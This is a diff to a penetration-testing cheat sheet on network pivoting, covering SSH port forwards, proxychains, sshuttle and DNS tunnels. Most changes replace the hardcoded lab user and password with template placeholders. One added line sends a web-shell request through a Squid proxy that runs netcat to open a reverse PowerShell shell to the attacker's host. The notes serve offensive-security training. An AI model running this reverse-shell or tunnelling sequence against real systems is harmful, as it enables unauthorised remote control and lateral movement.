@@ -129,8 +129,8 @@ ssh -N -L 0.0.0.0:4455:{{TARGET_IP}}:445 {{USERNAME}}@<DEEP_IP>
 From Kali, talk to the pivot's WAN IP on the forwarded port:
 
 ```bash
-smbclient -p 4455 -L //<PIVOT_IP>/ -U hr_admin
-smbclient -p 4455 //<PIVOT_IP>/scripts -U hr_admin
+smbclient -p 4455 -L //<PIVOT_IP>/ -U {{USERNAME}}
+smbclient -p 4455 //<PIVOT_IP>/scripts -U {{USERNAME}}
 ```
 
 > Verify the listener came up with `ss -ntplu` (look for `0.0.0.0:4455`). One `-L` = one destination
@@ -157,7 +157,7 @@ tail /etc/proxychains4.conf
 Now prefix any TCP tool with `proxychains` (use `-sT` full-connect + `-Pn` — SOCKS can't do raw/ICMP):
 
 ```bash
-proxychains smbclient -L //{{TARGET_IP}}/ -U hr_admin
+proxychains smbclient -L //{{TARGET_IP}}/ -U {{USERNAME}}
 proxychains nmap -vvv -sT -Pn -n --top-ports=20 {{TARGET_IP}}
 ```
 
@@ -176,6 +176,9 @@ Then **from the pivot**, dial back to Kali and expose a deep service on Kali's l
 ```bash
 # on the pivot: bind 2345 on KALI, forward it through the pivot to <DEEP_IP>:5432
 ssh -N -R 127.0.0.1:2345:<DEEP_IP>:5432 {{USERNAME}}@{{LHOST}}
+
+# Or Squid Proxy 
+curl "http://127.0.0.1:8080/shell.php?cmd=nc.exe+{{LHOST}}+{{LPORT}}+-e+powershell.exe" --proxy {{TARGET_IP}}:3128
 ```
 
 Now the service looks local to Kali:
@@ -225,7 +228,7 @@ sshuttle -r {{USERNAME}}@<PIVOT_IP>:2222 10.4.50.0/24 172.16.50.0/24
 Now tools run **untunnelled-looking** — no proxychains prefix:
 
 ```bash
-smbclient -L //{{TARGET_IP}}/ -U hr_admin --password=Welcome1234
+smbclient -L //{{TARGET_IP}}/ -U {{USERNAME}} --password={{PASSWORD}}
 ```
 
 > sshuttle can't forward non-TCP and doesn't help against DPI (it's still SSH on the wire). It's the
@@ -414,7 +417,7 @@ command (host) 1> listen 127.0.0.1:4455 {{TARGET_IP}}:445
 Now hit the forwarded port from the DNS-server box:
 
 ```bash
-smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
+smbclient -p 4455 -L //127.0.0.1 -U {{USERNAME}} --password={{PASSWORD}}
 ```
 
 > DNS tunnelling is **slow** (data crammed into DNS labels) — fine for a shell / small port-forward,
